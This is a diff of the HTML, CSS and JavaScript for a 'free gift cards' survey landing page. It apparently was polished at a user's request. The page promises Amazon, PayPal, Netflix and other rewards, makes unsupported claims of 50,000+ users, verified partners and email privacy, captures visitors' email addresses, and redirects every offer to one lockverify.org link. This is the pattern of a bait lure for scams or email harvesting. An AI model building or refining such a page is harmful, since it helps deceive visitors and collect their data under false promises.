@@ -1,394 +1,480 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Earn Free Gift Cards - Quick Surveys</title>
   <style>
-    body {
-      margin: 0;
+    :root{
+      --blue:#1e88e5;
+      --green:#43a047;
+      --muted:#666;
+      --bg:#f0f2f5;
+      --card-shadow: 0 4px 16px rgba(0,0,0,0.08);
+      --radius:12px;
+    }
+
+    /* Reset / base */
+    *{box-sizing:border-box}
+    body{
+      margin:0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f0f2f5;
-      color: #333;
-      line-height: 1.5;
+      background:var(--bg);
+      color:#222;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      line-height:1.45;
+    }
+    a { color:inherit; text-decoration:none; }
+
+    header{
+      background:var(--blue);
+      color:#fff;
+      text-align:center;
+      padding:1.5rem 1rem;
+    }
+    header h1{margin:0; font-size:1.9rem}
+    header p{margin:6px 0 0; opacity:0.95}
+
+    /* Hero */
+    .hero{
+      position:relative;
+      background: url('banner.jpg') no-repeat center/cover;
+      padding:3.5rem 1.25rem;
+      color:#fff;
+      text-align:center;
+      overflow:hidden;
+    }
+    .hero::before{
+      content:'';
+      position:absolute;
+      inset:0;
+      background:rgba(0,0,0,0.45);
+      z-index:1;
+      border-radius:0;
+    }
+    .hero .hero-inner{ position:relative; z-index:2; max-width:900px; margin:0 auto; }
+    .hero h1{ font-size:2.4rem; margin:0 0 0.6rem; line-height:1.1; }
+    .hero p{ font-size:1.05rem; margin:0 auto 1rem; color:rgba(255,255,255,0.95); max-width:720px;}
+
+    /* Scroll down chevron */
+    .scroll-down{
+      position:absolute;
+      left:50%;
+      transform:translateX(-50%);
+      bottom:14px;
+      z-index:3;
+      cursor:pointer;
+      width:44px;
+      height:44px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:rgba(255,255,255,0.12);
+      border-radius:999px;
+      transition:transform .25s ease;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .scroll-down:hover{ transform:translateX(-50%) scale(1.06); }
+    .chev{
+      width:18px;
+      height:18px;
+      display:block;
+      fill: #fff;
+      animation: bounce 1.8s infinite;
+    }
+    @keyframes bounce{
+      0%{ transform:translateY(0) }
+      50%{ transform:translateY(6px) }
+      100%{ transform:translateY(0) }
     }
 
-    header {
-      background-color: #1e88e5;
-      color: #fff;
-      padding: 1.5rem 1rem;
-      text-align: center;
+    /* Offers */
+    .offers{
+      display:flex;
+      flex-wrap:wrap;
+      justify-content:center;
+      gap:1.25rem;
+      padding:2.4rem 1rem;
+      max-width:1200px;
+      margin:0 auto;
     }
-
-    header h1 {
-      font-size: 2rem;
-      margin-bottom: 0.5rem;
+    .offer-card{
+      background:#fff;
+      width:300px;
+      border-radius:var(--radius);
+      box-shadow:var(--card-shadow);
+      padding:1.25rem;
+      text-align:center;
+      transition:transform .18s ease, box-shadow .18s ease;
     }
-
-    header p {
-      font-size: 1rem;
-      opacity: 0.9;
+    .offer-card:hover{ transform:translateY(-6px); box-shadow:0 10px 28px rgba(0,0,0,0.08) }
+    .offer-card img{ width:100%; height:170px; object-fit:cover; border-radius:8px; display:block; }
+    .offer-card h3{ margin:0.9rem 0 0.4rem; font-size:1.12rem; color:#222 }
+    .offer-card p{ margin:0; color:#555; font-size:0.94rem }
+    .get-started{
+      margin-top:0.95rem;
+      display:inline-block;
+      appearance:none;
+      border:0;
+      padding:0.6rem 1rem;
+      border-radius:8px;
+      background:var(--blue);
+      color:#fff;
+      font-weight:600;
+      cursor:pointer;
+      transition:background .18s ease;
     }
-
-    /* Hero Section */
-    .hero {
-      position: relative;
-      background: url('banner.jpg') no-repeat center center/cover;
-      color: white;
-      text-align: center;
-      padding: 4rem 2rem;
-    }
-
-    .hero::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      z-index: 1;
-    }
-
-    .hero h1,
-    .hero p {
-      position: relative;
-      z-index: 2;
-    }
-
-    .hero h1 {
-      font-size: 2.4rem;
-      margin-bottom: 1rem;
-    }
-
-    .hero p {
-      font-size: 1.1rem;
-      max-width: 700px;
-      margin: 0 auto;
-    }
-
-    /* Offers Section */
-    .offers {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 1.5rem;
-      padding: 2rem 1rem;
-    }
-
-    .offer-card {
-      background: #fff;
-      border-radius: 12px;
-      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
-      width: 300px;
-      text-align: center;
-      padding: 1.5rem;
-      transition: transform 0.2s ease;
-    }
-
-    .offer-card:hover {
-      transform: translateY(-5px);
-    }
-
-    .offer-card img {
-      width: 100%;
-      border-radius: 10px;
-      height: 180px;
-      object-fit: cover;
-    }
-
-    .offer-card h3 {
-      margin-top: 1rem;
-      font-size: 1.2rem;
-    }
-
-    .offer-card p {
-      color: #555;
-      font-size: 0.95rem;
-    }
-
-    .offer-card button {
-      display: inline-block;
-      margin-top: 1rem;
-      padding: 0.6rem 1.2rem;
-      background-color: #1e88e5;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .offer-card button:hover {
-      background-color: #1565c0;
-    }
+    .get-started:hover{ background:#1565c0 }
 
     /* Video Section */
-    .video-section {
-      background: #fff;
-      padding: 2rem 1rem;
-      text-align: center;
+    .video-section{
+      background:#fff;
+      padding:1.75rem 1rem;
+      text-align:center;
+      margin:0 0 1.25rem;
+      box-shadow:0 2px 10px rgba(0,0,0,0.03);
+    }
+    .video-section h2{ color:var(--blue); font-size:1.6rem; margin:0 0 6px; }
+    .video-section p{ color:#555; margin:0 0 12px; font-size:1rem; }
+    .video-wrapper{ max-width:880px; margin:0 auto; }
+    .video-wrapper iframe{
+      width:100%;
+      height:360px;  /* desktop */
+      border-radius:10px;
+      border:none;
+      box-shadow:0 6px 20px rgba(0,0,0,0.08);
     }
 
-    .video-section h2 {
-      font-size: 1.8rem;
-      margin-bottom: 0.5rem;
-      color: #1e88e5;
+    /* Authenticity / trust */
+    .authenticity{
+      padding:1.5rem 1rem;
+      text-align:center;
+    }
+    .authenticity h2{ color:var(--blue); margin:0 0 0.6rem; font-size:1.3rem; }
+    .authenticity p{ max-width:780px; margin:6px auto; color:#555; }
+
+    /* Modal (overlay) */
+    .modal{
+      position:fixed;
+      inset:0;
+      display:none;
+      align-items:center;
+      justify-content:center;
+      background:rgba(0,0,0,0.55);
+      z-index:1200;
+      padding:20px;
+    }
+    .modal.show{ display:flex; }
+
+    .modal-content{
+      width:100%;
+      max-width:480px;
+      background:#fff;
+      border-radius:14px;
+      padding:22px;
+      box-shadow:0 12px 40px rgba(0,0,0,0.18);
+      position:relative;
     }
 
-    .video-section p {
-      font-size: 1rem;
-      color: #555;
-      margin-bottom: 1rem;
+    /* Close X */
+    .modal-close{
+      position:absolute;
+      top:10px;
+      right:10px;
+      background:transparent;
+      border:0;
+      font-size:20px;
+      line-height:1;
+      cursor:pointer;
+      color:#666;
+      padding:8px;
+      border-radius:8px;
+    }
+    .modal-close:hover{ background:#f1f1f1; color:#222 }
+
+    .modal-content h2{ text-align:center; color:var(--blue); margin:0 0 14px; font-size:1.3rem; }
+    .modal-content small{ display:block; text-align:center; color:var(--muted); margin-top:12px; font-size:0.88rem }
+
+    /* Form row: input + continue button (desktop) */
+    .modal-form{
+      display:flex;
+      gap:12px;
+      align-items:center;
+      margin:0;
+    }
+    .modal-form input[type="email"]{
+      flex:1;
+      padding:12px 14px;
+      font-size:1rem;
+      border-radius:10px;
+      border:1px solid #d6d6d6;
+      outline:none;
+      transition:box-shadow .12s ease, border-color .12s ease;
+      margin-right:12px; /* <-- user requested margin on right */
+    }
+    .modal-form input[type="email"]:focus{
+      border-color:var(--blue);
+      box-shadow:0 6px 18px rgba(30,136,229,0.08);
+    }
+    .submit-btn{
+      white-space:nowrap;
+      padding:11px 14px;
+      border-radius:10px;
+      border:0;
+      background:var(--green);
+      color:#fff;
+      font-weight:700;
+      cursor:pointer;
+    }
+    .submit-btn:disabled{ opacity:0.6; cursor:wait }
+
+    .modal-actions{ margin-top:12px; display:flex; justify-content:center; gap:10px; }
+    .close-btn{ padding:9px 14px; border-radius:10px; border:0; background:#e0e0e0; color:#333; cursor:pointer; }
+
+    /* small helper message area used after pressing Continue */
+    .modal-status{ margin-top:10px; text-align:center; color:var(--muted); font-size:0.9rem; min-height:18px; }
+
+    /* Responsive */
+    @media (max-width:900px){
+      .hero h1{ font-size:2rem }
+      .video-wrapper iframe{ height:300px }
+    }
+    @media (max-width:640px){
+      header h1{ font-size:1.6rem }
+      .hero{ padding:2.75rem 1rem }
+      .hero h1{ font-size:1.55rem }
+      .hero p{ font-size:0.98rem }
+
+      .offer-card{ width:92%; max-width:420px }
+      .video-wrapper iframe{ height:240px }
+
+      /* modal: stack input & button vertically on small screens */
+      .modal-form{ flex-direction:column; gap:8px; align-items:stretch }
+      .modal-form input[type="email"]{ margin-right:0; }
+      .modal-form .submit-btn{ width:100% }
+    }
+    @media (max-width:420px){
+      .video-wrapper iframe{ height:200px }
+      .hero p{ font-size:0.92rem }
     }
 
-    .video-wrapper {
-      max-width: 800px;
-      margin: 0 auto;
-    }
-
-    .video-wrapper iframe {
-      width: 100%;
-      height: 360px; /* Desktop */
-      border: none;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    }
-
-    /* Authenticity Section */
-    .authenticity {
-      background: #f9fafb;
-      padding: 2rem 1rem;
-      text-align: center;
-    }
-
-    .authenticity h2 {
-      color: #1e88e5;
-      margin-bottom: 1rem;
-    }
-
-    .authenticity p {
-      max-width: 700px;
-      margin: 0 auto 1rem;
-      color: #555;
-    }
-
-    /* Popup Modal */
-    .modal-content {
-  background: #fff;
-  padding: 2rem 1.5rem;
-  border-radius: 12px;
-  width: 100%;
-  max-width: 380px;
-  text-align: center;
-  box-shadow: 0 6px 20px rgba(0,0,0,0.2);
-}
-
-.modal-content h2 {
-  margin-bottom: 1rem;
-  font-size: 1.4rem;
-  color: #1e88e5;
-}
-
-.modal-content input {
-  width: 100%;
-  padding: 0.75rem;
-  margin-bottom: 0.8rem;
-  border: 1px solid #ccc;
-  border-radius: 8px;
-  font-size: 1rem;
-  outline: none;
-  transition: border 0.2s ease;
-}
-
-.modal-content input:focus {
-  border-color: #1e88e5;
-  box-shadow: 0 0 5px rgba(30,136,229,0.3);
-}
-
-.modal-content small {
-  display: block;
-  margin-bottom: 1rem;
-  color: #666;
-  font-size: 0.85rem;
-}
-
-.modal-buttons {
-  display: flex;
-  justify-content: center;
-  gap: 0.5rem;
-}
-
-.modal-content button {
-  flex: 1;
-  padding: 0.8rem 1rem;
-  border: none;
-  border-radius: 8px;
-  font-size: 1rem;
-  font-weight: 600;
-  cursor: pointer;
-  transition: background 0.3s ease;
-}
-
-.submit-btn {
-  background: #43a047;
-  color: white;
-}
-
-.submit-btn:hover {
-  background: #388e3c;
-}
-
-.close-btn {
-  background: #e0e0e0;
-  color: #333;
-}
-
-.close-btn:hover {
-  background: #bdbdbd;
-}
-
-
-    /* Responsive Layout */
-    @media (max-width: 1024px) {
-      header h1 { font-size: 1.8rem; }
-      .hero h1 { font-size: 2rem; }
-      .hero p { font-size: 1rem; }
-    }
-
-    @media (max-width: 768px) {
-      .offers {
-        flex-direction: column;
-        align-items: center;
-      }
-
-      .video-wrapper iframe {
-        height: 240px;
-      }
-
-      header h1 { font-size: 1.6rem; }
-      .hero h1 { font-size: 1.8rem; }
-      .offer-card { width: 90%; }
-    }
-
-    @media (max-width: 480px) {
-      .video-wrapper iframe {
-        height: 200px;
-      }
-
-      header h1 { font-size: 1.4rem; }
-      .hero h1 { font-size: 1.6rem; }
-      .hero p { font-size: 0.95rem; }
-      .offer-card h3 { font-size: 1rem; }
-    }
+    /* prevent body scroll when modal open */
+    body.modal-open{ overflow:hidden; touch-action:none; }
   </style>
 </head>
 <body>
 
-<header>
-  <h1>🎁 Earn Free Gift Cards</h1>
-  <p>Take surveys, share your opinion, and get rewarded!</p>
-</header>
+  <header>
+    <h1>🎁 Earn Free Gift Cards</h1>
+    <p>Take surveys, share your opinion, and get rewarded!</p>
+  </header>
 
-<section class="hero">
-  <h1>Get Rewarded for Your Opinions</h1>
-  <p>Join thousands of users earning gift cards from Amazon, PayPal, Starbucks and more. Start by entering your email below:</p>
-</section>
+  <!-- Hero -->
+  <section class="hero" aria-label="Hero">
+    <div class="hero-inner">
+      <h1>Get Rewarded for Your Opinions</h1>
+      <p>Join thousands of users earning gift cards from Amazon, PayPal, Starbucks and more. Start by entering your email below:</p>
+    </div>
 
-<section class="offers">
-  <div class="offer-card">
-    <img src="amazon.jpg" alt="Amazon Gift Card" />
-    <h3>$100 Amazon Gift Card</h3>
-    <p>Answer a short shopping survey to qualify for this exclusive Amazon gift card offer.</p>
-    <button onclick="openPopup()">Get Started</button>
-  </div>
+    <!-- scroll down icon -->
+    <button class="scroll-down" aria-label="Scroll down to offers" title="Scroll to offers">
+      <!-- simple chevron SVG -->
+      <svg class="chev" viewBox="0 0 24 24" aria-hidden="true">
+        <path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/>
+      </svg>
+    </button>
+  </section>
 
-  <div class="offer-card">
-    <img src="starbucks.jpg" alt="Starbucks Card" />
-    <h3>$50 Starbucks Gift Card</h3>
-    <p>Love coffee? Take a survey about your coffee habits and claim your reward.</p>
-    <button onclick="openPopup()">Get Started</button>
-  </div>
+  <!-- Offers -->
+  <section class="offers" id="offers">
+    <div class="offer-card">
+      <img src="amazon.jpg" alt="Amazon Gift Card" />
+      <h3>$100 Amazon Gift Card</h3>
+      <p>Answer a short shopping survey to qualify for this exclusive Amazon gift card offer.</p>
+      <button class="get-started" data-href="https://lockverify.org/cl/i/428rj4">Get Started</button>
+    </div>
 
-  <div class="offer-card">
-    <img src="wallmart.jpg" alt="Walmart Card" />
-    <h3>$75 Walmart Voucher</h3>
-    <p>Share your grocery experience and receive a Walmart voucher as a thank-you!</p>
-    <button onclick="openPopup()">Get Started</button>
-  </div>
+    <div class="offer-card">
+      <img src="starbucks.jpg" alt="Starbucks Card" />
+      <h3>$50 Starbucks Gift Card</h3>
+      <p>Love coffee? Take a survey about your coffee habits and claim your reward.</p>
+      <button class="get-started" data-href="https://lockverify.org/cl/i/428rj4">Get Started</button>
+    </div>
 
-  <div class="offer-card">
-    <img src="netflix.jpg" alt="Netflix Gift Card" />
-    <h3>3-Month Netflix Subscription</h3>
-    <p>Answer a few entertainment preference questions and receive 3 months of Netflix for free!</p>
-    <button onclick="openPopup()">Get Started</button>
-  </div>
+    <div class="offer-card">
+      <img src="wallmart.jpg" alt="Walmart Card" />
+      <h3>$75 Walmart Voucher</h3>
+      <p>Share your grocery experience and receive a Walmart voucher as a thank-you!</p>
+      <button class="get-started" data-href="https://lockverify.org/cl/i/428rj4">Get Started</button>
+    </div>
 
-  <div class="offer-card">
-    <img src="paypal.jpg" alt="PayPal Cash Reward" />
-    <h3>$50 PayPal Cash</h3>
-    <p>Complete a short financial habits survey and receive $50 directly in your PayPal account.</p>
-    <button onclick="openPopup()">Get Started</button>
-  </div>
+    <div class="offer-card">
+      <img src="netflix.jpg" alt="Netflix Gift Card" />
+      <h3>3-Month Netflix Subscription</h3>
+      <p>Answer a few entertainment preference questions and receive 3 months of Netflix for free!</p>
+      <button class="get-started" data-href="https://lockverify.org/cl/i/428rj4">Get Started</button>
+    </div>
 
-  <div class="offer-card">
-    <img src="spotify.jpg" alt="Spotify Premium Gift Card" />
-    <h3>3-Month Spotify Premium</h3>
-    <p>Answer a short survey about your music preferences and get 3 months of Spotify Premium for free!</p>
-    <button onclick="openPopup()">Get Started</button>
-  </div>
-</section>
+    <div class="offer-card">
+      <img src="paypal.jpg" alt="PayPal Cash Reward" />
+      <h3>$50 PayPal Cash</h3>
+      <p>Complete a short financial habits survey and receive $50 directly in your PayPal account.</p>
+      <button class="get-started" data-href="https://lockverify.org/cl/i/428rj4">Get Started</button>
+    </div>
 
-<section class="video-section">
-  <h2>How It Works</h2>
-  <p>Watch this quick video to learn how our rewards system works and how you can start earning today.</p>
-  <div class="video-wrapper">
-    <iframe src="vid.mp4" allowfullscreen></iframe>
-  </div>
-</section>
+    <div class="offer-card">
+      <img src="spotify.jpg" alt="Spotify Premium Gift Card" />
+      <h3>3-Month Spotify Premium</h3>
+      <p>Answer a short survey about your music preferences and get 3 months of Spotify Premium for free!</p>
+      <button class="get-started" data-href="https://lockverify.org/cl/i/428rj4">Get Started</button>
+    </div>
+  </section>
 
-<section class="authenticity">
-  <h2>Trusted by Thousands</h2>
-  <p>We’ve helped over <strong>50,000+ users</strong> claim rewards safely and securely.</p>
-  <p>All surveys are verified and partners are reputable brands like Amazon, Starbucks, and PayPal.</p>
-  <p>Your privacy is our priority – your email will never be shared with third parties.</p>
-</section>
+  <!-- Video Section (no autoplay) -->
+  <section class="video-section" aria-label="How it works">
+    <h2>How It Works</h2>
+    <p>Watch this quick video to learn how our rewards system works and how you can start earning today.</p>
+    <div class="video-wrapper">
+      <!-- keep it a simple embed without autoplay -->
+      <iframe src="vid.mp4" allowfullscreen title="How it works video"></iframe>
+    </div>
+  </section>
 
-<!-- Email Popup -->
-<div id="emailModal" class="modal">
-  <div class="modal-content">
-    <h2>Enter Your Email</h2>
-    <input type="email" id="popupEmail" placeholder="Your email address" required />
-    <small>We respect your privacy. No spam ever.</small>
-    <div class="modal-buttons">
-      <button class="submit-btn" onclick="submitEmail()">Continue</button>
-      <button class="close-btn" onclick="closePopup()">Cancel</button>
+  <!-- Authenticity -->
+  <section class="authenticity" aria-label="Why choose us">
+    <h2>Trusted by Thousands</h2>
+    <p>We’ve helped over <strong>50,000+</strong> users claim rewards safely and securely. All surveys are verified and partners are reputable brands like Amazon, Starbucks, and PayPal. Your privacy is our priority — we never share your email with third parties.</p>
+  </section>
+
+  <!-- Modal -->
+  <div id="emailModal" class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+    <div class="modal-content" role="document">
+      <button class="modal-close" aria-label="Close modal" title="Close" id="modalCloseBtn">&times;</button>
+      <h2 id="modalTitle">Enter Your Email</h2>
+
+      <!-- form: inline on desktop (input margin-right requested) -->
+      <form id="emailForm" class="modal-form" novalidate>
+        <input id="popupEmail" type="email" placeholder="Your email address" aria-label="Email address" required />
+        <button type="submit" class="submit-btn" aria-label="Continue">Continue</button>
+      </form>
+
+      <div class="modal-actions">
+        <button class="close-btn" id="modalCancelBtn">Cancel</button>
+      </div>
+
+      <div class="modal-status" id="modalStatus" aria-live="polite"></div>
+      <small style="display:block; text-align:center; color:#777; margin-top:10px;">We respect your privacy. No spam ever.</small>
     </div>
   </div>
-</div>
 
+  <script>
+    (function(){
+      const DEFAULT_REDIRECT = "https://lockverify.org/cl/i/428rj4";
+      let targetUrl = DEFAULT_REDIRECT;
 
-<script>
-  function openPopup() {
-    document.getElementById("emailModal").style.display = "flex";
-  }
+      // utilities
+      const $ = sel => document.querySelector(sel);
+      const $$ = sel => Array.from(document.querySelectorAll(sel));
 
-  function closePopup() {
-    document.getElementById("emailModal").style.display = "none";
-  }
+      const modal = $('#emailModal');
+      const emailInput = $('#popupEmail');
+      const emailForm = $('#emailForm');
+      const modalStatus = $('#modalStatus');
+      const closeBtn = $('#modalCloseBtn');
+      const cancelBtn = $('#modalCancelBtn');
+      const scrollDownBtn = document.querySelector('.scroll-down');
 
-  function submitEmail() {
-    const email = document.getElementById("popupEmail").value;
-    if (!email) {
-      alert("Please enter a valid email address.");
-      return;
-    }
+      function openPopup(href){
+        targetUrl = href || DEFAULT_REDIRECT;
+        modal.classList.add('show');
+        document.body.classList.add('modal-open');
+        // small delay then focus input for nicer UX
+        setTimeout(()=> {
+          emailInput.focus();
+          emailInput.select && emailInput.select();
+        },120);
+      }
 
-    console.log("Captured Email:", email); // backend integration here
-    window.location.href = "https://lockverify.org/cl/i/428rj4";
-  }
-</script>
+      function closePopup(){
+        modal.classList.remove('show');
+        document.body.classList.remove('modal-open');
+        modalStatus.textContent = '';
+        emailForm.reset();
+      }
 
+      // attach to all Get Started buttons (works for buttons added later too)
+      document.addEventListener('click', function(e){
+        const el = e.target.closest && e.target.closest('.get-started');
+        if(!el) return;
+        e.preventDefault();
+        const href = el.dataset.href || el.getAttribute('data-href') || DEFAULT_REDIRECT;
+        openPopup(href);
+      });
+
+      // close handlers
+      closeBtn && closeBtn.addEventListener('click', closePopup);
+      cancelBtn && cancelBtn.addEventListener('click', closePopup);
+
+      // click outside modal-content closes
+      modal.addEventListener('click', function(e){
+        if(e.target === modal) closePopup();
+      });
+
+      // ESC key to close
+      document.addEventListener('keydown', function(e){
+        if(e.key === 'Escape' && modal.classList.contains('show')) closePopup();
+      });
+
+      // form submit via enter or continue button
+      emailForm.addEventListener('submit', function(e){
+        e.preventDefault();
+        submitEmail();
+      });
+
+      // submit logic
+      function submitEmail(){
+        const email = (emailInput.value || '').trim();
+        // basic email validation
+        const valid = /^\S+@\S+\.\S+$/.test(email);
+        if(!valid){
+          modalStatus.textContent = 'Please enter a valid email address.';
+          modalStatus.style.color = '#d32f2f';
+          emailInput.focus();
+          return;
+        }
+
+        // disable form to prevent double submits
+        const submitBtn = emailForm.querySelector('.submit-btn');
+        submitBtn.disabled = true;
+        modalStatus.style.color = 'var(--muted)';
+        modalStatus.textContent = 'Checking and redirecting…';
+
+        // pretend to save to backend (you can replace with fetch)
+        try{
+          console.log("Captured Email:", email);
+          // Example: send email to your endpoint (uncomment & adjust)
+          // fetch('/collect-email', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({email, offer:targetUrl})});
+        } catch(err){
+          console.warn(err);
+        }
+
+        // small delay for UX then redirect
+        setTimeout(function(){
+          // unlock body before redirect (not strictly needed)
+          document.body.classList.remove('modal-open');
+          window.location.href = targetUrl;
+        }, 450);
+      }
+
+      // scroll-down behavior
+      scrollDownBtn && scrollDownBtn.addEventListener('click', function(){
+        const offers = document.getElementById('offers');
+        if(offers) offers.scrollIntoView({behavior:'smooth', block:'start'});
+      });
+
+      // ensure video doesn't autoplay: nothing to do - iframe src has no autoplay flags
+    })();
+  </script>
 </body>
 </html>
